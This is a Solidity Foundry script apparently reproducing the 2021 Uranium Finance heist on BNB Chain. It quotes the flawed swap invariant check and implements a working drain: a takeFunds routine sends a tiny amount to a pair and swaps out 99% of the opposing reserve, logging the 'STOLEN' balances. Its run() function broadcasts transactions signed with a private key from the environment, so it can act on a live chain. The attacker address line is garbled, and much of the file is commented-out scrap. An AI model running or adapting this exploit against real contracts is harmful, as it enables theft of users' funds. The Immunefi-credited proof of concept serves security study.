// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IERC20, IUniswapV2Factory, IUniswapV2Pair, IUniswapV2Router} from "script/interface.sol";

import "forge-std/Script.sol";
import "forge-std/Test.sol";

// @KeyInfo - Total Lost : $50 M
// Attacker : 0xd9936EA91a461aA4B727a7e0xc47bdd0a852a88a019385ea3ff57cf8de79f019d3661bcD6cD257481c
// AttackContract : 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae
// Txhash : https://bscscan.com/tx/0x5a504fe72ef7fc76dfeb4d979e533af4e23fe37e90b5516186d5787893c37991

// REF: https://twitter.com/FrankResearcher/status/1387347025742557186
// Credit: https://medium.com/immunefi/building-a-poc-for-the-uranium-heist-ec83fbd83e9f

/*
Vuln code: 
   uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
   uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
   require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), ‘UraniumSwap: K’);

Critically, we see in Uranium’s implementation that the magic value for fee calculation is 10000 instead of the original 1000. 
The check does not apply the new magic value and instead uses the original 1000. 
This means that the K after a swap is guaranteed to be 100 times larger than the K before the swap when no token balance changes have occurred.*/
// CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
// address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant tether = address(0x55d398326f99059fF775485246999027B3197955);
address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
IUniswapV2Router constant uniswapV2Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
// IUniSwapV2 constant daiweth = IUniSwapV2(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);

interface IWrappedNative {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

contract Exam1 is Test, Script {
    uint256 secret = vm.envUint("PRIVATE_KEY");
    address attacker = vm.rememberKey(secret);

    function setUp() public {
        vm.label(wbnb, "wbnb");
        vm.label(busd, "busd");
        vm.label(tether, "tether");
        vm.label(uraniumFactory, "uraniumFactory");
        vm.label(attacker, "attacker");
    }

    /// @dev
    /// forge script -f exam1 Exam1
    function run() public {
        vm.startBroadcast(secret);
        console.log(attacker); // 10 ether
        console.log(attacker.balance); // 10 ether
        IWrappedNative(wbnb).deposit{value: 1.0 ether}();
        console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(attacker)));
        takeFunds(wbnb, busd, 0.0001 ether);
        takeFunds(busd, wbnb, 0.0099 ether);
        takeFunds(wbnb, busd, 0.0001 ether);
        takeFunds(busd, wbnb, 0.0099 ether);
        takeFunds(wbnb, busd, 0.0001 ether);
        takeFunds(busd, wbnb, 0.0099 ether);
        takeFunds(wbnb, busd, 0.0001 ether);
        takeFunds(busd, wbnb, 0.0099 ether);

        console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(msg.sender));
        console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(msg.sender));

        IWrappedNative(wbnb).withdraw(IERC20(wbnb).balanceOf(msg.sender));

        console.log((attacker.balance - 16206778886231361245843) / 1e18); // 10 ether
        console.log((attacker.balance - 16206778886231361245843) % 1e18); // 10 ether

        // address dest = address(0xa6050eE278beff5A1E496C465E1458762d770370);
        // dest.call{value: 100 ether}("");
        // console.log(dest.balance);
        // testExploit();
        // vm.allowCheatcodes(attacker);

        // console.log("Attacker: ", attacker);
        // console.log(attacker.balance); // 10 ether

        // // console.log(wbnb.code.length);
        // console.log(busd.code.length);
        // console.log(IERC20(busd).balanceOf(attacker));
        // console.log(attacker);
        // console.log(address(this));
        // console.log(address(this).balance); // 10 ether

        // // console.log(IERC20(wbnb).balanceOf(attacker));
        // // console.log(IERC20(busd).balanceOf(attacker));

        // testExploit();

        // IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
        // console.log(attacker.balance); // 10 ether

        // // console.log(address(this).balance);
        // console.log(IERC20(busd).balanceOf(user));
        // console.log(IERC20(wbnb).balanceOf(user));
        // console.log(IERC20(busd).balanceOf(address(this)));
        // console.log(IERC20(wbnb).balanceOf(address(this)));
        // IWrappedNative(wbnb).
        // vm.stopBroadcast();
    }

    // 0x06fdde03
    // 0x095ea7b3      address,uint256
    // 0x18160ddd
    // 0x23b872dd      address,address,uint256
    // 0x2e1a7d4d      uint256
    // 0x313ce567
    // 0x70a08231      address
    // 0x95d89b41
    // 0xa9059cbb      address,uint256
    // 0xd0e30db0
    // 0xdd62ed3e      address,address

    function testExploit() public {
        wrap();
        takeFunds(wbnb, busd, 9 ether);
        takeFunds(busd, wbnb, 10 ether);
        console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(msg.sender));
        console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(msg.sender));

        // console.logBytes(wbnb.code);
    }

    function wrap() internal {}

    function takeFunds(address token0, address token1, uint256 amount) internal {
        IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));
        // console.log(address(pair).code.length);
        IERC20(token0).transfer(address(pair), amount);
        uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;

        pair.swap(
            pair.token0() == address(token1) ? amountOut : 0,
            pair.token0() == address(token1) ? 0 : amountOut,
            msg.sender,
            new bytes(0)
        );
    }

    receive() external payable {}
}

// forge test --contracts test/Uranium_exp.sol -vv
